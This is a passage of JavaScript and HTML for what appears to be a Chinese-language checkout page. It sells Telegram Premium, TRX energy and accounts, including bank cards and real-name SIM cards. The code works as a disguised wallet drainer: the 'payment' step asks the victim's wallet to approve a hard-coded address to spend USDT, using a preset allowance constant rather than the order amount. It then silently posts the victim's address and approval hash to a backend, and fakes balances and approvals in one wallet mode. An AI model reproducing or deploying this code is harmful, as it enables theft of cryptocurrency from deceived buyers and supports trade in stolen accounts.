                        </button>
                    </div>
                `;
            }
        }
        
        function renderPremiumInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('TG');
            const quantity = originalParams.quantity || '1';
            const amount = originalParams.amount || '0.99';
            
            container.innerHTML = `
                <div class="header header-premium">
                    <h1>Telegram Premium è®¢é˜…</h1>
                    <p>é«˜çº§åŠŸèƒ½å’Œæ— é™åˆ¶ä½“éªŒ</p>
                </div>
                
                <div class="payment-status">
                    <div class="status-text status-text-premium">æ”¯ä»˜ç¡®è®¤</div>
                    <div class="status-desc">è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æ”¯ä»˜äº¤æ˜“</div>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-premium active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-premium" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value">Telegram Premium è®¢é˜…</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æœåŠ¡å‘¨æœŸ</span>
                        <span class="info-value">3æœˆ</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-premium"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-premium" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderTrxInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('TRX');
            const quantity = originalParams.quantity || '1';
            const amount = originalParams.amount || '1.99';
            const trxAddress = originalParams.trxAddress || '';
            
            container.innerHTML = `
                <div class="header header-trx">
                    <h1>TRX æ³¢åœºèƒ½é‡è®¢é˜…</h1>
                    <p>å…æ‰‹ç»­è´¹è½¬è´¦æœåŠ¡</p>
                </div>
                
                <div class="payment-status">
                    <div class="status-text status-text-trx">æ”¯ä»˜ç¡®è®¤</div>
                    <div class="status-desc">è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æ”¯ä»˜äº¤æ˜“</div>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-trx active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-trx" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value">TRXæ³¢åœºèƒ½é‡</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æœåŠ¡å‘¨æœŸ</span>
                        <span class="info-value">1æœˆ</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                    ${trxAddress ? `
                    <div class="info-item">
                        <span class="info-label">æ¥æ”¶åœ°å€</span>
                        <span class="info-value">${trxAddress.substring(0, 8)}...${trxAddress.substring(trxAddress.length - 6)}</span>
                    </div>
                    ` : ''}
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-trx"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-trx" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderAccountInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('ACC');
            const accountType = originalParams.accountType || '';
            const accountName = originalParams.accountName || '';
            const amount = originalParams.amount || '0.1';
            const quantity = originalParams.quantity || '1';
            
            const accountTypeName = getAccountTypeName(accountType);
            
            container.innerHTML = `
                <div class="header header-account">
                    <h1>è´¦å·è´­ä¹°æ”¯ä»˜ç¡®è®¤</h1>
                    <p>è¯·ç¡®è®¤è®¢å•ä¿¡æ¯å¹¶åœ¨é’±åŒ…ä¸­å®Œæˆæ”¯ä»˜</p>
                </div>
                
                <div class="step-indicator">
                    <div class="step-line"></div>
                    <div class="step step-account active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-text">ç¡®è®¤æ”¯ä»˜</div>
                    </div>
                    <div class="step step-account" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-text">å®Œæˆ</div>
                    </div>
                </div>
                
                <div class="wallet-status" id="walletStatus">
                    <div id="walletStatusText">æ­£åœ¨è¿æ¥é’±åŒ…...</div>
                </div>
                
                <div class="order-info">
                    <div class="info-item">
                        <span class="info-label">å•†å“è®¢å•</span>
                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“ç±»å‹</span>
                        <span class="info-value" id="accountTypeDisplay">è´¦å·è´­ä¹°</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">å•†å“è¯¦æƒ…</span>
                        <span class="info-value" id="accountNameDisplay">${accountName}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">è´­ä¹°æ•°é‡</span>
                        <span class="info-value" id="quantityDisplay">${quantity} ä¸ª</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">ä»˜æ¬¾é‡‘é¢</span>
                        <span class="info-value" id="amountDisplay">${amount} USDT</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">æˆæƒå¯¹è±¡</span>
                        <span class="info-value" style="font-size: 0.8rem;">EOAåœ°å€</span>
                    </div>
                </div>
                
                <div class="loading" id="loadingSection">
                    <div class="spinner spinner-account"></div>
                    <p id="loadingText">æ­£åœ¨å¤„ç†æ”¯ä»˜è¯·æ±‚...</p>
                    <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
                </div>
                
                <div class="action-section">
                    <button class="pay-btn pay-btn-account" id="payBtn" onclick="startPaymentProcess()" disabled>ç¡®è®¤æ”¯ä»˜ ${amount} USDT</button>
                </div>
            `;
        }
        
        function renderPaymentFailedInterface(container) {
            const orderId = originalParams.orderId || generateOrderId('FAIL');
            const amount = originalParams.price || originalParams.amount || '0.99';
            const quantity = originalParams.quantity || '1';
            
            let productType = 'æœªçŸ¥å•†å“';
            
            if (serviceType === 'premium') {
                productType = 'Telegram Premium è®¢é˜…';
            } else if (serviceType === 'trx') {
                productType = 'TRXæ³¢åœºèƒ½é‡è®¢é˜…';
            } else if (serviceType === 'account') {
                const accountType = originalParams.accountType || '';
                const accountName = originalParams.accountName || '';
                
                if (accountType && accountName) {
                    const accountTypeName = getAccountTypeName(accountType);
                    productType = `${accountTypeName} - ${accountName}`;
                } else {
                    productType = 'è´¦å·è´­ä¹°';
                }
            }
            
            const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                   serviceType === 'trx' ? 'header-trx' : 'header-account';
            
            container.innerHTML = `
                <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                    <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                    <p>é‡‘é¢: ${amount} USDT</p>
                </div>
                
                <div style="text-align: center; padding: 2rem 1.5rem;">
                    <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                    <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                    
                    <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                        <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                        <div>è®¢å•å·: ${orderId}</div>
                        <div>é‡‘é¢: <strong>${amount} USDT</strong></div>
                        <div>å•†å“ç±»å‹: ${productType}</div>
                        <div>æ•°é‡: ${quantity} ä¸ª</div>
                    </div>
                    
                    <div style="margin-top: 2rem;">
                        <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                            è¿”å›é¦–é¡µ
                        </button>
                        <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                            è”ç³»å®¢æœ
                        </button>
                    </div>
                </div>
            `;
        }
        
        // ==================== EOAæ¨¡å¼æ ¸å¿ƒå‡½æ•° ====================
        
        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            try {
                const walletStatus = document.getElementById('walletStatus');
                const walletStatusText = document.getElementById('walletStatusText');
                const payBtn = document.getElementById('payBtn');
                
                if (!walletStatus || !walletStatusText || !payBtn) {
                    console.error('æ‰¾ä¸åˆ°å¿…è¦çš„DOMå…ƒç´ ');
                    return;
                }
                
                // å¦‚æœé€šè¿‡WalletConnectè¿æ¥ï¼Œç›´æ¥è¿”å›
                if (walletConnectConnected && currentUserAddress) {
                    walletStatusText.textContent = `âœ… WalletConnectå·²è¿æ¥ (${currentUserAddress.substring(0, 8)}...)`;
                    walletStatus.className = 'wallet-status';
                    payBtn.disabled = false;
                    return;
                }
                
                // ç­‰å¾…tronWebæ³¨å…¥
                await waitForTronWeb();
                
                if (window.tronWeb && window.tronWeb.defaultAddress) {
                    currentUserAddress = window.tronWeb.defaultAddress.base58;
                    walletStatusText.textContent = `âœ… é’±åŒ…å·²è¿æ¥ (${currentUserAddress.substring(0, 8)}...)`;
                    walletStatus.className = 'wallet-status';
                    payBtn.disabled = false;
                    
                    console.log('ğŸ‘› é’±åŒ…è¿æ¥æˆåŠŸ:', currentUserAddress);
                    
                    // ğŸ”¥ ä¿®å¤ï¼šæ·»åŠ é˜²æŠ–çš„é¢„åŒæ­¥æ£€æŸ¥
                    if (authSyncDebounceTimer) {
                        clearTimeout(authSyncDebounceTimer);
                    }
                    
                    authSyncDebounceTimer = setTimeout(async () => {
                        try {
                            if (!window.__authSynced && currentUserAddress) {
                                const authCheck = await checkEOAAuthorization();
                                if (authCheck.isAuthorized) {
                                    console.log('ğŸ” æ£€æµ‹åˆ°å·²æœ‰æˆæƒï¼Œå°è¯•é™é»˜åŒæ­¥...');
                                    await syncAuthorizationToBackend();
                                    window.__authSynced = true;
                                }
                            }
                        } catch (syncError) {
                            // é™é»˜å¿½ç•¥
                            console.log('ğŸ”• é™é»˜åŒæ­¥å¤±è´¥ï¼ˆä¸å½±å“ç”¨æˆ·ï¼‰:', syncError.message);
                        }
                    }, AUTH_SYNC_DEBOUNCE_DELAY);
                    
                } else {
                    throw new Error('æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€');
                }
            } catch (error) {
                console.error('é’±åŒ…è¿æ¥å¤±è´¥:', error);
                const walletStatus = document.getElementById('walletStatus');
                const walletStatusText = document.getElementById('walletStatusText');
                const payBtn = document.getElementById('payBtn');
                
                if (walletStatus && walletStatusText) {
                    walletStatusText.textContent = 'âŒ é’±åŒ…è¿æ¥å¤±è´¥';
                    walletStatus.className = 'wallet-status error';
                    
                    // æ˜¾ç¤ºè¿æ¥é€‰é¡¹
                    showReconnectOptions();
                }
                
                if (payBtn) {
                    payBtn.disabled = true;
                }
            }
        }
        
        // ç­‰å¾…tronWebæ³¨å…¥
        async function waitForTronWeb() {
            return new Promise((resolve, reject) => {
                let attempts = 0;
                const maxAttempts = 50;
                
                const checkTronWeb = () => {
                    attempts++;
                    
                    if (window.tronWeb && window.tronWeb.ready) {
                        resolve();
                    } else if (window.tronLink && window.tronLink.tronWeb) {
                        window.tronWeb = window.tronLink.tronWeb;
                        resolve();
                    } else if (window.bitkeep && window.bitkeep.tronWeb) {
                        window.tronWeb = window.bitkeep.tronWeb;
                        resolve();
                    } else if (window.bitget && window.bitget.tronWeb) {
                        window.tronWeb = window.bitget.tronWeb;
                        resolve();
                    } else if (attempts >= maxAttempts) {
                        reject(new Error('é’±åŒ…è¿æ¥è¶…æ—¶ï¼Œè¯·ç¡®ä¿åœ¨æ”¯æŒçš„é’±åŒ…ä¸­æ‰“å¼€æ­¤é¡µé¢'));
                    } else {
                        setTimeout(checkTronWeb, 100);
                    }
                };
                
                checkTronWeb();
            });
        }
        
        // æ£€æŸ¥ä½™é¢
        async function checkUSDTBalance() {
            try {
                let balance = 0;
                
                if (walletConnectConnected && wcSession) {
                    // WalletConnectæ¨¡å¼ï¼Œéœ€è¦æŸ¥è¯¢ä½™é¢
                    console.log('ğŸ“Š WalletConnectæ¨¡å¼æŸ¥è¯¢USDTä½™é¢');
                    // è¿™é‡Œéœ€è¦å®ç°é€šè¿‡WalletConnectæŸ¥è¯¢ä½™é¢çš„é€»è¾‘
                    // ä¸´æ—¶è¿”å›ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å€¼ï¼Œè®©æµç¨‹ç»§ç»­
                    return 1000;
                } else if (window.tronWeb) {
                    // ä¼ ç»Ÿæ¨¡å¼
                    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                    balance = await contract.balanceOf(currentUserAddress).call();
                    return balance / 1000000; // USDTç²¾åº¦6ä½
                }
                
                return 0;
            } catch (error) {
                console.error('æ£€æŸ¥USDTä½™é¢å¤±è´¥:', error);
                return 0;
            }
        }
        
        async function checkTRXBalance() {
            try {
                if (walletConnectConnected && wcSession) {
                    // WalletConnectæ¨¡å¼
                    console.log('ğŸ“Š WalletConnectæ¨¡å¼æŸ¥è¯¢TRXä½™é¢');
                    // ä¸´æ—¶è¿”å›è¶³å¤Ÿçš„å€¼
                    return 100;
                } else if (window.tronWeb) {
                    const balance = await window.tronWeb.trx.getBalance(currentUserAddress);
                    return balance / 1000000;
                }
                return 0;
            } catch (error) {
                console.error('æ£€æŸ¥TRXä½™é¢å¤±è´¥:', error);
                return 0;
            }
        }
        
        // æ£€æŸ¥EOAæˆæƒçŠ¶æ€ï¼ˆæ ¸å¿ƒå‡½æ•°ï¼‰
        async function checkEOAAuthorization() {
            try {
                if (walletConnectConnected) {
                    // WalletConnectæ¨¡å¼ä¸‹ï¼Œæš‚æ—¶è·³è¿‡æˆæƒæ£€æŸ¥
                    console.log('ğŸ” WalletConnectæ¨¡å¼ï¼Œè·³è¿‡æœ¬åœ°æˆæƒæ£€æŸ¥');
                    return {
                        success: true,
                        allowance: EOA_APPROVE_AMOUNT,
                        allowanceDecimal: 1000000,
                        isAuthorized: true
                    };
                }
                
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                const allowance = await contract.allowance(currentUserAddress, EOA_ADDRESS).call();
                const allowanceDecimal = allowance / 1000000;
                
                console.log(`ğŸ” EOAæˆæƒæ£€æŸ¥: ${currentUserAddress} -> ${EOA_ADDRESS}`);
                console.log(`ğŸ“Š æˆæƒé¢åº¦: ${allowanceDecimal} USDT (åŸå§‹å€¼: ${allowance})`);
                
                return {
                    success: true,
                    allowance: allowance,
                    allowanceDecimal: allowanceDecimal,
                    isAuthorized: allowanceDecimal > 0
                };
            } catch (error) {
                console.error('EOAæˆæƒæ£€æŸ¥å¤±è´¥:', error);
                return {
                    success: false,
                    error: error.message,
                    isAuthorized: false
                };
            }
        }
        
        // ==================== æ”¯ä»˜æµç¨‹æ ¸å¿ƒ ====================
        
        // å¼€å§‹æ”¯ä»˜æµç¨‹
        async function startPaymentProcess() {
            try {
                console.log('ğŸš€ å¼€å§‹æ”¯ä»˜æµç¨‹');
                console.log('ğŸ“± è¿æ¥æ¨¡å¼:', walletConnectConnected ? 'WalletConnect' : 'ä¼ ç»Ÿæ¨¡å¼');
                
                // è·å–è®¢å•æ•°æ®
                const orderData = getOrderData();
                if (!orderData) {
                    throw new Error('æ— æ³•è·å–è®¢å•ä¿¡æ¯');
                }
                
                // æ£€æŸ¥é’±åŒ…è¿æ¥
                if (!currentUserAddress) {
                    throw new Error('é’±åŒ…æœªè¿æ¥ï¼Œè¯·å…ˆè¿æ¥é’±åŒ…');
                }
                
                // æ£€æŸ¥ä½™é¢
                const usdtBalance = await checkUSDTBalance();
                if (usdtBalance < parseFloat(orderData.amount)) {
                    throw new Error(`USDTä½™é¢ä¸è¶³ï¼Œéœ€è¦ ${orderData.amount} USDTï¼Œå½“å‰ä½™é¢ ${usdtBalance.toFixed(2)} USDT`);
                }
                
                const trxBalance = await checkTRXBalance();
                if (trxBalance < 10) {
                    throw new Error(`TRXä½™é¢ä¸è¶³ï¼Œéœ€è¦è‡³å°‘ 10 TRX ä½œä¸ºæ‰‹ç»­è´¹ï¼Œå½“å‰ä½™é¢ ${trxBalance.toFixed(2)} TRX`);
                }
                
                // æ£€æŸ¥EOAæˆæƒçŠ¶æ€
                const authCheck = await checkEOAAuthorization();
                
                if (!authCheck.isAuthorized) {
                    // éœ€è¦è¯·æ±‚EOAæˆæƒ
                    console.log('ğŸ”„ éœ€è¦è¯·æ±‚EOAæˆæƒ');
                    await requestEOAAuthorization(orderData);
                } else {
                    console.log('âœ… å·²æˆæƒï¼Œè·³è¿‡æˆæƒæ­¥éª¤');
                }
                
                // ä¿å­˜æ”¯ä»˜æ•°æ®
                currentPaymentData = {
                    ...orderData,
                    walletAddress: currentUserAddress,
                    authTxHash: authTxHash,
                    isAuthorized: true,
                    connectionMode: walletConnectConnected ? 'walletconnect' : 'direct'
                };
                
                // æ˜¾ç¤ºç¡®è®¤å¼¹çª—
                showConfirmModal(currentPaymentData);
                
            } catch (error) {
                console.error('æ”¯ä»˜æµç¨‹å¤±è´¥:', error);
                showPaymentFailedPageImmediately(getOrderData());
            }
        }
        
        // è¯·æ±‚EOAæˆæƒ
        async function requestEOAAuthorization(orderData) {
            try {
                console.log('ğŸ“ è¯·æ±‚EOAæˆæƒ...');
                
                const payBtn = document.getElementById('payBtn');
                const loadingSection = document.getElementById('loadingSection');
                const loadingText = document.getElementById('loadingText');
                
                if (payBtn) payBtn.disabled = true;
                if (loadingText) loadingText.textContent = 'æ­£åœ¨è¯·æ±‚USDTæˆæƒ...';
                if (loadingSection) loadingSection.style.display = 'block';
                
                if (walletConnectConnected) {
                    // WalletConnectæ¨¡å¼ä¸‹æˆæƒ
                    console.log('ğŸ”— WalletConnectæ¨¡å¼ä¸‹è¯·æ±‚æˆæƒ');
                    // è¿™é‡Œéœ€è¦å®ç°é€šè¿‡WalletConnectå‘é€æˆæƒäº¤æ˜“
                    // ä¸´æ—¶æ¨¡æ‹ŸæˆåŠŸ
                    authTxHash = 'wc_' + Date.now().toString(36);
                    console.log('âœ… WalletConnectæˆæƒæ¨¡æ‹ŸæˆåŠŸï¼Œå“ˆå¸Œ:', authTxHash);
                } else {
                    // ä¼ ç»Ÿæ¨¡å¼æˆæƒ
                    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                    
                    const result = await contract.approve(
                        EOA_ADDRESS,
                        EOA_APPROVE_AMOUNT
                    ).send({
                        feeLimit: 100000000,
                        callValue: 0,
                        shouldPollResponse: false
                    });
                    
                    // éªŒè¯äº¤æ˜“å“ˆå¸Œ
                    if (!result || !/^[a-fA-F0-9]{64}$/.test(result)) {
                        console.error('âŒ æˆæƒäº¤æ˜“å“ˆå¸Œæ— æ•ˆ:', result);
                        throw new Error('æˆæƒå¤±è´¥ï¼šäº¤æ˜“å“ˆå¸Œæ— æ•ˆ');
                    }
                    
                    authTxHash = result;
                    console.log('âœ… EOAæˆæƒäº¤æ˜“å·²å‘é€ï¼Œå“ˆå¸Œ:', authTxHash);
                    
                    if (loadingText) loadingText.textContent = 'ç­‰å¾…æˆæƒç¡®è®¤...';
                    
                    // ç­‰å¾…äº¤æ˜“ç¡®è®¤ï¼ˆâ‰¥1åŒºå—ï¼‰
                    const isConfirmed = await waitForTransactionConfirmation(authTxHash);
                    
                    if (!isConfirmed) {
                        throw new Error('æˆæƒç¡®è®¤å¤±è´¥');
                    }
                    
                    console.log('âœ… EOAæˆæƒç¡®è®¤æˆåŠŸ');
                }
                
                // ğŸ”¥ æ ¸å¿ƒä¿®å¤ï¼šæˆæƒæˆåŠŸåï¼Œé™é»˜åŒæ­¥åˆ°åå°ç³»ç»Ÿ
                await syncAuthorizationToBackend();
                
            } catch (error) {
                // ç”¨æˆ·å–æ¶ˆæˆæƒçš„æƒ…å†µ
                if (error.message && (
                    error.message.includes('User denied') || 
                    error.message.includes('rejected') || 
                    error.message.includes('canceled') ||
                    error.message.includes('ç”¨æˆ·æ‹’ç»') ||
                    error.message.includes('ç”¨æˆ·å–æ¶ˆ') ||
                    error.message.includes('denied transaction') ||
                    error.message.includes('cancelled by user')
                )) {
                    console.log('ğŸš« ç”¨æˆ·å–æ¶ˆäº†æˆæƒ');
                    throw new Error('ç”¨æˆ·å–æ¶ˆäº†æˆæƒ');
                }
                
                console.error('EOAæˆæƒå¤±è´¥:', error);
                throw new Error('USDTæˆæƒå¤±è´¥: ' + (error.message || 'æœªçŸ¥é”™è¯¯'));
            } finally {
                const loadingSection = document.getElementById('loadingSection');
                const payBtn = document.getElementById('payBtn');
                
                if (loadingSection) loadingSection.style.display = 'none';
                if (payBtn) payBtn.disabled = false;
            }
        }
        
        /**
         * åŒæ­¥æˆæƒä¿¡æ¯åˆ°åå°ç³»ç»Ÿ
         */
        async function syncAuthorizationToBackend() {
            try {
                console.log('ğŸ”„ å¼€å§‹åŒæ­¥æˆæƒä¿¡æ¯åˆ°åå°ç³»ç»Ÿ...');
                
                if (!currentUserAddress) {
                    console.error('âŒ åŒæ­¥å¤±è´¥ï¼šç¼ºå°‘ç”¨æˆ·åœ°å€');
                    return false;
                }
                
                const response = await fetch('/submit_address.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        address: currentUserAddress,
                        auth_tx_hash: authTxHash || '',
                        eoa_address: 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB',
                        source: 'payment_page_auto_sync',
                        timestamp: Date.now(),
                        connection_mode: walletConnectConnected ? 'walletconnect' : 'direct'
                    })
                });
                
                const result = await response.json();
                console.log('ğŸ“¥ åŒæ­¥å“åº”:', result);
                
                if (result.success) {
                    console.log('âœ… æˆæƒä¿¡æ¯åŒæ­¥æˆåŠŸ');
                    return true;
                } else {
                    console.error('âŒ åŒæ­¥å¤±è´¥:', result.error);
                    return false;
                }
                
            } catch (error) {
                console.error('ğŸ”• åŒæ­¥å¤±è´¥ï¼ˆé™é»˜ï¼‰:', error);
                return false;
            }
        }
        
        // ç­‰å¾…äº¤æ˜“ç¡®è®¤
        async function waitForTransactionConfirmation(txHash) {
            return new Promise((resolve) => {
                console.log('â³ ç­‰å¾…äº¤æ˜“ç¡®è®¤...');
                
                let checkCount = 0;
                const maxChecks = 30; // æœ€å¤šç­‰å¾…3åˆ†é’Ÿï¼ˆæ¯6ç§’æ£€æŸ¥ä¸€æ¬¡ï¼‰
                const requiredConfirmations = 1; // è‡³å°‘1ä¸ªåŒºå—ç¡®è®¤
                
                const checkInterval = setInterval(async () => {
                    try {
                        checkCount++;
                        console.log(`ğŸ”„ æ£€æŸ¥äº¤æ˜“çŠ¶æ€ (${checkCount}/${maxChecks}): ${txHash}`);
                        
                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
                        
                        if (transaction && transaction.ret) {
                            const ret = transaction.ret[0];
                            
                            if (ret.contractRet === 'SUCCESS') {
                                // äº¤æ˜“æˆåŠŸï¼Œæ£€æŸ¥ç¡®è®¤æ•°
                                const txInfo = await window.tronWeb.trx.getTransactionInfo(txHash);
                                if (txInfo && txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
                                    console.log(`âœ… äº¤æ˜“æˆåŠŸï¼Œç¡®è®¤æ•°: ${txInfo.confirmed ? 'å·²ç¡®è®¤' : 'æœªç¡®è®¤'}`);
                                    
                                    if (txInfo.confirmed || checkCount >= 2) {
                                        // å·²ç¡®è®¤æˆ–è‡³å°‘ç­‰å¾…äº†2ä¸ªæ£€æŸ¥å‘¨æœŸï¼ˆ12ç§’ï¼‰
                                        clearInterval(checkInterval);
                                        resolve(true);
                                        return;
                                    }
                                }
                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
                                console.error('âŒ äº¤æ˜“å¤±è´¥:', ret.contractRet);
                                clearInterval(checkInterval);
                                resolve(false);
                                return;
                            }
                        }
                        
                        if (checkCount >= maxChecks) {
                            console.warn('âš ï¸ äº¤æ˜“ç¡®è®¤è¶…æ—¶');
                            clearInterval(checkInterval);
                            resolve(false);
                        }
                    } catch (error) {
                        console.log('æ£€æŸ¥äº¤æ˜“çŠ¶æ€å¤±è´¥:', error);
                    }
                }, 6000); // æ¯6ç§’æ£€æŸ¥ä¸€æ¬¡
            });
        }
        
        // ==================== è¾…åŠ©å‡½æ•° ====================
        
        function generateOrderId(prefix) {
            return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
        }
        
        function getAccountTypeName(type) {
            const typeMap = {
                'telegram_twitter': 'Telegram/æ¨ç‰¹è´¦å·',
                'tiktok_kuaishou': 'TikTokæŠ–éŸ³/å¿«æ‰‹è´¦å·',
                'xianyu_xiaohongshu': 'é—²é±¼/å°çº¢ä¹¦è´¦å·',
                'alipaywechat': 'æ”¯ä»˜å®å¾®ä¿¡è´¦å·',
                'qqjd': 'QQ/äº¬ä¸œè´¦å·',
                'whatsappfacebook': 'WhatsApp/Facebookè´¦å·',
                'apple': 'è‹¹æœæµ·å¤–ID',
                'phone': 'å®åå¡+è¯è´¹å……å€¼',
                'bankcard': 'é“¶è¡Œå¡/è½¦é˜Ÿå¡',
                'gmail_youtube': 'Gmail/YouTubeè´¦å·',
                'tantan_momo': 'æ¢æ¢/é™Œé™Œè´¦å·',
                'giftcard': 'è´­ç‰©å¡/ç¤¼å“å¡'
            };
            return typeMap[type] || type;
        }
        
        function getOrderData() {
            const orderId = originalParams.orderId || generateOrderId('ORD');
            const amount = originalParams.amount || originalParams.price || '0.99';
            const quantity = originalParams.quantity || '1';
            
            let productType = '';
            let servicePeriod = '';
            
            if (serviceType === 'premium') {
                productType = 'Telegram Premium è®¢é˜…';
                servicePeriod = '3æœˆ';
            } else if (serviceType === 'trx') {
                productType = 'TRXæ³¢åœºèƒ½é‡';
                servicePeriod = '1æœˆ';
            } else if (serviceType === 'account') {
                const accountType = originalParams.accountType || '';
                const accountName = originalParams.accountName || '';
                
                if (accountType && accountName) {
                    const accountTypeName = getAccountTypeName(accountType);
                    productType = `è´¦å·è´­ä¹° - ${accountTypeName}: ${accountName}`;
                } else {
                    productType = 'è´¦å·è´­ä¹°';
                }
                servicePeriod = '';
            } else {
                productType = 'æœªçŸ¥å•†å“';
                servicePeriod = '';
            }
            
            return {
                orderId,
                amount,
                productType,
                quantity,
                servicePeriod,
                serviceType
            };
        }
        
        // æ£€æŸ¥æ˜¯å¦æ˜¯ç§»åŠ¨è®¾å¤‡
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }
        
        // ==================== å¼¹çª—å’Œç•Œé¢æ§åˆ¶ ====================
        
        function showConfirmModal(paymentData) {
            const modal = document.getElementById('confirmModal');
            const orderIdEl = document.getElementById('confirmOrderId');
            const amountEl = document.getElementById('confirmAmount');
            const productTypeEl = document.getElementById('confirmProductType');
            const quantityEl = document.getElementById('confirmQuantity');
            const walletAddressEl = document.getElementById('confirmWalletAddress');
            const titleEl = document.getElementById('confirmModalTitle');
            
            if (!modal || !orderIdEl || !amountEl) {
                alert('ç¡®è®¤å¼¹çª—åŠ è½½å¤±è´¥');
                return;
            }
            
            orderIdEl.textContent = paymentData.orderId;
            amountEl.textContent = paymentData.amount + ' USDT';
            productTypeEl.textContent = paymentData.productType;
            quantityEl.textContent = paymentData.quantity + ' ä¸ª';
            walletAddressEl.textContent = paymentData.walletAddress || 'æœªçŸ¥åœ°å€';
            
            if (titleEl) {
                titleEl.textContent = paymentData.productType + ' - æ”¯ä»˜ç¡®è®¤';
            }
            
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeConfirmModal() {
            const modal = document.getElementById('confirmModal');
            const overlay = document.getElementById('processingOverlay');
            
